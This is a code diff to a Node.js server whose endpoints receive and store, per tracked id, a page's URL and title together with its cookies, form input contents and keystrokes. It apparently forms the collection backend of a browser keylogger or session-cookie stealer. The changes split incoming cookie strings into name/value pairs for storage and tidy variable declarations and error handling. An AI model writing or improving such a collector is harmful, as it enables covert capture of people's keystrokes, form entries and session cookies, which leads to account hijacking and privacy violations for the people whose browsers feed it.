@@ -19,17 +19,22 @@ app.get('/create', async () => {
 })
 
 app.post('/add/cookies', async (req) => {
-    var body = req.body;
+    let body = req.body;
     try {
-        await db.query('INSERT INTO Cookies VALUES ($1,NOW(),$2,$3,$4);',[body.id, body.url, body.title, body.cookies])
+        let cookies = body.cookies.split(";")
+        for (let i = 0; i < cookies.length; i++) {
+            let cookie = cookies[i].split("=")
+            cookie = cookie.map(i => i.trim());
+            await db.query('INSERT INTO Cookies VALUES ($1,NOW(),$2,$3,$4,$5);',[body.id, body.url, body.title, cookie[0], cookie[1]])
+        }
         return {success: 'true'}
     } catch (err) {
-        throw new Error("Bad payload")
+        throw new Error(err)
     }
 })
 
 app.post('/add/input', async (req) => {
-    var body = req.body;
+    let body = req.body;
     try {
         await db.query('INSERT INTO Inputs VALUES ($1,NOW(),$2,$3,$4,$5);',[body.id, body.url, body.title, body.type, body.content])
         return {success: 'true'}
@@ -39,7 +44,7 @@ app.post('/add/input', async (req) => {
 })
 
 app.post('/add/keystrokes', async (req) => {
-    var body = req.body;
+    let body = req.body;
     try {
         await db.query('INSERT INTO Keystrokes VALUES ($1,NOW(),$2,$3,$4);',[body.id, body.url, body.title, body.content])
         return {sucess: 'true'}
@@ -53,7 +58,7 @@ const start = async () => {
         await db.connect();
         await app.listen(3000);
     } catch (err) {
-        await client.end();
+        await db.end();
         app.log.error(err);
         process.exit(1);
     }
